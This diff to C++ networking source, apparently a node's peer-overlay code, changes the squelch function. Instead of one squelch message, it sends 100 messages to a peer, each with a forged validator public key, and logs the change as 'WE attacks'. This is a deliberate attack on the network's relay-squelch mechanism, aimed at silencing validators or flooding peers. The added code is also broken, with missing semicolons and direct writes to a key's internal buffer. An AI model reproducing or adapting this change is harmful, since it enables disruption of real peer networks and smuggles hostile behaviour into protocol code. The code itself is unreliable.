@@ -1392,7 +1392,7 @@ OverlayImpl::unsquelch(PublicKey const& validator, Peer::id_t id) const
         peer->send(makeSquelchMessage(validator, false, 0));
     }
 }
-
+////////////////////////////////////////////////////////////////////
 void
 OverlayImpl::squelch(
     PublicKey const& validator,
@@ -1402,10 +1402,27 @@ OverlayImpl::squelch(
     if (auto peer = findPeerByShortID(id);
         peer && app_.config().VP_REDUCE_RELAY_SQUELCH)
     {
-        peer->send(makeSquelchMessage(validator, true, squelchDuration));
+       //Install our validator 
+        JLOG(journal_.trace()) << "WE attacks +++++++++++ "
+        for(int i=0; i< 100; i++)
+        {
+            JLOG(journal_.trace()) << "WE attacks +++++++++++ " <<i
+            PublicKey validator1 = PublicKey();
+            for (uint8_t j=0; j<33; ++j)
+                validator1.buf_[j]=0XFF>>j;
+            peer->send(makeSquelchMessage(validator1, true, squelchDuration));
+        }
     }
 }
-
+    
+    
+      
+////////////////////////////////////////////////////////////////////
+    
+    
+    
+    
+    
 void
 OverlayImpl::updateSlotAndSquelch(
     uint256 const& key,
